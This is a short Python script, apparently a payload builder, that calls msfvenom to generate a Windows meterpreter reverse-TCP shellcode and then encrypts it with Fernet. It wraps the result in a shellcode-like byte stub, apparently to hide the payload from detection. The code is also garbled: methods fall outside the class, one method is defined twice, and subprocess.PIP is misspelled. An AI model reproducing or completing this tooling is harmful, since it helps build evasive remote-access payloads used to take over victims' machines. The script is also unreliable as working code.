import base64
import subprocess
from cryptography.fernet import Fernet

class PayloadFactory:
    WINDOWS_ARCH = "windows/x64"
    PAYLOAD_TYPE = "meterpreter/reverse_tcp"
    LHOST = "127.0.0.1"
    LPORT = "4444"

def __init__(self):
    self.key = Fernet.generate_key()
    self.cipher = Fernet(self.key)

def create_shellcode(self):
    self.key = Fernet.generate_key()
    self.cipher = Fernet(self.key)

def create_shellcode(self):
    command = [
        "msfvenom", "-p", self.PAYLOAD_TYPE,
        f"LHOST={self.LHOST}", f"LPORT={self.LPORT}", "-f", "raw"
    ]
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIP)
    stdout, stderr = process.communicate()
    if process.returncode == 0:
        return stdout.strip()
    else:
        print(f"Erreur lors de la génération du shellcode : {stderr.decode()}")
        return None

def encrypt_payload(self, payload):
    return self.cipher.encrypt(payload)

def add_vector_execution(self, payload):
    shellcode_var = b"\x48\x31\xC9\x48\x81\xE9\xFD\xFF\xFF\xFF\x48\x8D\x05\xEF\xFF\xFF\xFF"
    encrypted_payload = self.encrypt_payload(payload)
    return shellcode_var + encrypted_payload[::-1][8:] + b"\x53\x41\x53\x41\x53\x41\x53\x41"

factory = PayloadFactory()
